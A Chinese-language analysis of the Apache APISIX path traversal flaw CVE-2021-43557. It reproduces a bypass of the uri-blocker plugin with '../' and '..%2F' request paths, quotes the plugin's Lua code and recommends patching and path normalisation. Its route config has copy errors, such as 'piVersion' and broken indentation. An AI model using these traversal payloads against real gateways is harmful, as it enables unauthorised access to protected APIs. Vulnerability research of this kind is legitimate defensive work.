# Apache APISIX路径穿越漏洞（CVE-2021-43557）分析

## 基本情况

Apache
APISIX是一个动态、实时、高效的API网关，其提供了丰富的流量管理功能，包括：负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等，其被广泛应用到企业API处理和微服务等业务中。  
2021年11月，安全研究人员Marcin Niemiec发现APISIX路径穿越漏洞，该漏洞是由于Apache APISIX入口控制器
$request_uri
变量的不安全使用导致的，官方给出该漏洞的CVE编号为[CVE-2021-43557](https://nvd.nist.gov/vuln/detail/CVE-2021-43557)，并及时发布了该漏洞的安全补丁。

## 漏洞复现

### 安装Apache APISIX

参考[官方文档](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md)，安装Apache
APISIX。

首先安装[Minikube](https://minikube.sigs.k8s.io/docs/start/)和[Helm](https://helm.sh/)，接着使用Helm安装APISIX，命令如下：

    
    
    helm repo add apisix https://charts.apiseven.com
    helm repo add bitnami https://charts.bitnami.com/bitnami
    helm repo update
    kubectl create ns ingress-apisix
    helm install apisix apisix/apisix \
    --set gateway.type=NodePort \
    --set ingress-controller.enabled=true \
    --namespace ingress-apisix
    --set ingress-controller.config.apisix.serviceNamespace=ingress-apisix
    kubectl get service --namespace ingress-apisix
    

接着参考[文档](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/concepts/apisix_route.md)部署ApisixRouter，创建路由。参考[官方漏洞分析报告](http://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report)中给出的配置信息，在插件中配置public-service可以通过，阻止protected-service，配置如下：

    
    
    piVersion: apisix.apache.org/v2beta1
    kind: ApisixRoute
    metadata:
    name: public-service-route
    spec:
    http:
    - name: public-service-rule
        match:
        hosts:
        - app.test
        paths:
        - /public-service/*
        backends:
            - serviceName: public-service
            servicePort: 8080
        plugins:
        - name: proxy-rewrite
            enable: true
            config:
            regex_uri: ["/public-service/(.*)", "/$1"]
    - name: protected-service-rule
        match:
        hosts:
        - app.test
        paths:
        - /protected-service/*
        backends:
            - serviceName: protected-service
            servicePort: 8080
        plugins:
        - name: uri-blocker
            enable: true
            config:
            block_rules: ["^/protected-service(/?).*"]
            case_insensitive: true
        - name: proxy-rewrite
            enable: true
            config:
            regex_uri: ["/protected-service/(.*)", "/$1"]
    

### 复现漏洞场景

使用uri-blocker插件进行测试时，正常情况下：

访问public-service:

    
    
    $ ./apisix_request.sh "/public-service/public"
    Defaulted container "apisix" out of: apisix, wait-etcd (init)
    {"data":"public data"}
    

访问protected-service:

    
    
    $ ./apisix_request.sh "/protected-service/protected"
    Defaulted container "apisix" out of: apisix, wait-etcd (init)
    <html>
    <head><title>403 Forbidden</title></head>
    <body>
    <center><h1>403 Forbidden</h1></center>
    <hr><center>openresty</center>
    </body>
    </html>
    

可以看出，正常情况下public-service可以通过，protected-service被阻止访问了，但是如果我们在访问中添加了../的路径信息，发现可以绕过protected-service的访问限制，访问的URL如下：

    
    
    $ ./apisix_request.sh "/public-service/../protected-service/protected"
    

或者是：

    
    
    $ ./apisix_request.sh "/public-service/..%2Fprotected-service/protected"
    

可以发现返回结果均为正常访问结果：

    
    
    Defaulted container "apisix" out of: apisix, wait-etcd (init)
    {"data":"protected data"}
    

自此，可以发现成功绕过了URL的限制。可以发现漏洞并没有对../的穿越信息进行处理，于是可以绕过配置的访问限制，访问到没有权限的URL接口。

## 漏洞成因

该漏洞是一个典型的../引起的路径穿越漏洞，从而使得接口被未授权的用户访问到。仔细分析漏洞成因，从APISIX代码中可以看出，使用的uri-blocker插件代码如下：

    
    
    local core = require("apisix.core")
    local re_compile = require("resty.core.regex").re_match_compile
    local re_find = ngx.re.find
    local ipairs = ipairs
    
    local schema = {
        type = "object",
        properties = {
            block_rules = {
                type = "array",
                items = {
                    type = "string",
                    minLength = 1,
                    maxLength = 4096,
                },
                uniqueItems = true
            },
            rejected_code = {
                type = "integer",
                minimum = 200,
                default = 403
            },
            rejected_msg = {
                type = "string",
                minLength = 1
            },
            case_insensitive = {
                type = "boolean",
                default = false
            },
        },
        required = {"block_rules"},
    }
    
    
    local plugin_name = "uri-blocker"
    
    local _M = {
        version = 0.1,
        priority = 2900,
        name = plugin_name,
        schema = schema,
    }
    
    
    function _M.check_schema(conf)
        local ok, err = core.schema.check(schema, conf)
        if not ok then
            return false, err
        end
    
        for i, re_rule in ipairs(conf.block_rules) do
            local ok, err = re_compile(re_rule, "j")
            -- core.log.warn("ok: ", tostring(ok), " err: ", tostring(err),
            --               " re_rule: ", re_rule)
            if not ok then
                return false, err
            end
        end
    
        return true
    end
    
    
    function _M.rewrite(conf, ctx)
        core.log.info("uri: ", ctx.var.request_uri)
        core.log.info("block uri rules: ", conf.block_rules_concat)
    
        if not conf.block_rules_concat then
            local block_rules = {}
            for i, re_rule in ipairs(conf.block_rules) do
                block_rules[i] = re_rule
            end
    
            conf.block_rules_concat = core.table.concat(block_rules, "|")
            if conf.case_insensitive then
                conf.block_rules_concat = "(?i)" .. conf.block_rules_concat
            end
            core.log.info("concat block_rules: ", conf.block_rules_concat)
        end
    
        local from = re_find(ctx.var.request_uri, conf.block_rules_concat, "jo")
        if from then
            if conf.rejected_msg then
                return conf.rejected_code, { error_msg = conf.rejected_msg }
            end
            return conf.rejected_code
        end
    end
    
    
    return _M
    

可以从上述代码中看出，该插件使用了ctx.var.request_uri变量进行阻塞决策，该变量在使用前并未做有效的处理，并未对路径合法、有效性进行判断，于是导致了路径穿越的问题。

## 漏洞影响和解决方案

漏洞影响Apache APISIX 2.10.2之前（不包含
2.10.2）的所有版本。未修复的版本将会导致攻击者可以绕过访问控制限制，访问未授权的API，同时可能使得自定义插件开发者的
ngx.var.request_uri 变量变得不可信任。

建议受影响的Apache APISIX版本用户尽快更新到最新版。同时，如果用户使用了自定义的插件时，建议做如下处理：

  * ngx.var.request_uri 变量在使用前进行路径规范化处理

  * 对 ctx.var.upstream_uri 和 ctx.var.uri 变量使用前进行检查，防止路径未规范化

## 总结

该漏洞的成因较简单，但是由于可以突破权限上的限制，对Apache APISIX用户的影响还是较大的，建议Apache
APISIX用户及时更新受影响的版本。同时，对于Apache
APISIX自定义插件的用户来说，应该在调用之前，详细分析传入参数的有效性，尤其对于权限检查方面，更需要进行标准化的处理。

## 参考链接

1.<https://apisix.apache.org/>

2.<https://github.com/apache/apisix>

3.<http://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report>

